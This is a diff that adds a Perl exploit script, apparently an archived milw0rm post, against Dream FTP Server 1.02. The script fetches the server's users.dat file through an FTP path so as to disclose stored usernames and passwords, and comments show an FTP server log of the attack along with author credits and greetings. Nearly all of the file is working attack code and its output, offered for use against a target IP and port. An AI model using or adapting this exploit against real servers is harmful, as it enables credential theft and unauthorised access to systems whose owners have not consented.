@@ -1,0 +1,95 @@
+#!/usr/bin/perl -w
+#
+# This Bug Similar to others found By My Friend : Stack <= so special Thanx
+# So You Can Exploit Arbitrary File Disclosure From The Server <== You can use Stack's Exploit To do That
+# But This Exploit i will get Users & Passwords Of The applicatin From : users.dat : C:\Program Files\BolinTech\users.dat
+# In This Exploit I Used The Port 80 You can use any port you want 21
+#################################################################################################################################
+#23/04/2009 13:20:25  FTP Server started on port 80.
+#23/04/2009 13:25:43  [0000000002] Client connected from 127.0.0.1.
+#23/04/2009 13:25:43  [0000000002] 220- ****************************************
+#23/04/2009 13:25:43  [0000000002] 220-
+#23/04/2009 13:25:43  [0000000002] 220-      Welcome to Dream FTP Server
+#23/04/2009 13:25:43  [0000000002] 220-      Copyright 2002 - 2004
+#23/04/2009 13:25:43  [0000000002] 220-      BolinTech Inc.
+#23/04/2009 13:25:43  [0000000002] 220-
+#23/04/2009 13:25:43  [0000000002] 220- ****************************************
+#23/04/2009 13:25:43  [0000000002] 220-
+#23/04/2009 13:25:43  [0000000002] 220  
+#23/04/2009 13:25:43  [0000000002] USER anonymous
+#23/04/2009 13:25:43  [0000000002] 331 Password required for anonymous
+#23/04/2009 13:25:43  [0000000002] PASS **********
+#23/04/2009 13:25:43  [0000000002] 230 User successfully logged in.
+#23/04/2009 13:25:43  [0000000002] PWD
+#23/04/2009 13:25:43  [0000000002] 257 "/" is current directory.
+#23/04/2009 13:25:43  [0000000002] TYPE I
+#23/04/2009 13:25:43  [0000000002] 200 Type set to I
+#23/04/2009 13:25:43  [0000000002] CWD Program Files
+#23/04/2009 13:25:43  [0000000002] 250 "/Program Files" is current directory.
+#23/04/2009 13:25:43  [0000000002] CWD BolinTech
+#23/04/2009 13:25:43  [0000000002] 250 "/Program Files/BolinTech" is current directory.
+#23/04/2009 13:25:43  [0000000002] MDTM users.dat
+#23/04/2009 13:25:43  [0000000002] 502 Command not implemented - Try HELP.
+#23/04/2009 13:25:43  [0000000002] PASV
+#23/04/2009 13:25:43  [0000000002] 227 Entering Passive Mode (127,0,0,1,11,145).
+#23/04/2009 13:25:43  [0000000002] RETR users.dat
+#23/04/2009 13:25:43  [0000000002] 150 Opening BINARY mode data connection for file transfer.
+#23/04/2009 13:25:43  [0000000002] 226 Transfer complete
+#23/04/2009 13:25:43  [0000000002] Client disconnected from 127.0.0.1.
+#################################################################################################################################
+# Download Product : http://www.softpedia.com/progDownload/Dream-FTP-Server-Download-47248.html
+# Special Thanx To All My Friends : Hussin X , ZoRLu , Jiko , Stack , SimO-sofT , Mag!c ompo , b0rizq , All MoroCCaN Hackers
+#################################################################################################################################
+# welcome To : WwW.Ma-HaxOrZ.CoM/vb <== Is Online
+#################################################################################################################################
+# Screenshot From My MS SP2 FR when exploiting in localhost : http://www.exploiter5.com/blog/Disclosure.png
+#################################################################################################################################
+use LWP::Simple;
+use LWP::UserAgent;
+
+print "\tDream FTP Server 1.02 (users.dat) Passwords/users Disclosure Exploit\n";
+
+print "\t****************************************************************\n";
+print "\t*      Found And Exploited By : Cyber-Zone (ABDELKHALEK)       *\n";
+print "\t*           E-mail : Paradis_des_fous[at]hotmail.fr            *\n";
+print "\t*          Home : WwW.IQ-TY.CoM , WwW.No-Exploit.CoM           *\n";
+print "\t*               From : MoroccO Figuig/Oujda City               *\n";
+print "\t****************************************************************\n\n\n\n";
+
+if(@ARGV < 3)
+{
+&help; exit();
+}
+sub help()
+{
+print "[X] Usage : perl $0 HackerName IP Port \n";
+print "[X] Exemple : perl $0 Cyber-Zone 127.0.0.1 80 \n";
+}
+($HackerName, $TargetIP, $AttackedPort) = @ARGV;
+print("Please Wait ! Connecting To The Server ......\n\n");
+sleep(5);
+
+print("          ******************************\n");
+print("          *             Status         *\n");
+print("          ******************************\n");
+print("$HackerName , AttaCking The Target : $TargetIP \n");
+print("On The Port : $AttackedPort , Just To Get Users/Passwords File :d\n");
+$terget1="Program Files";
+$target2="BolinTech";
+$target3="users.dat";
+$slash="/";
+$TargetFile=$terget1.$slash.$target2.$slash.$target3;
+$temp="/" x 2;
+my $boom = "ftp://" . $TargetIP . ":" . $AttackedPort . $temp . $TargetFile;
+print("Exploiting .....>    |80\n");
+sleep(15);
+print("Exploiting ..........|Done!\n");
+sleep(5);
+$Disclosure=get $boom;
+print("\n\n\n\n............File Contents Are Just Below...........\n");
+print("$Disclosure \n");
+print(".........................EOF.......................\n");
+print("Done For Fun //Figuigian HaCker\n");
+print("Some Womens Makes The World Special , Just By Being On it <3\n");
+
+# milw0rm.com [2009-04-23]
